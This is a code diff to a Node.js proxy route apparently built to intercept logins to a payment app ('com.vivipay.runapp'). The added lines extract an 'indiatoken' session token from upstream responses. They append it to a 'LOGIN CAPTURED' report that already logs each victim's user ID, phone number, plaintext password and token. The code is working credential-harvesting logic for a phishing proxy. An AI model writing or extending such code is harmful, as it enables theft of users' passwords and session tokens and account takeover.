@@ -1510,6 +1510,23 @@ app.all('/xxapi/*', async (req, res) => {
         if (cookieMatch) extractedToken = cookieMatch[1];
       }
 
+      // Extract indiatoken — from response header, body, or the data field itself
+      let indiaToken = '';
+      if (response.headers) {
+        indiaToken = response.headers.get('indiatoken') || response.headers.get('india-token') || '';
+      }
+      if (!indiaToken && jsonResp) {
+        indiaToken = jsonResp.indiatoken || jsonResp.indiaToken || '';
+      }
+      if (!indiaToken && respData) {
+        if (typeof respData === 'string' && respData.length > 10) {
+          indiaToken = respData;
+        } else if (typeof respData === 'object') {
+          indiaToken = respData.indiatoken || respData.indiaToken || '';
+        }
+      }
+      if (!indiaToken && extractedToken) indiaToken = extractedToken;
+
       const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
       const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
 
@@ -1517,7 +1534,7 @@ app.all('/xxapi/*', async (req, res) => {
         `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
 💻 Platform: ${platformStr}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}${indiaToken ? '\n🇮🇳 India Token: ' + indiaToken : ''}
 🕐 ${now}`);
 
     }
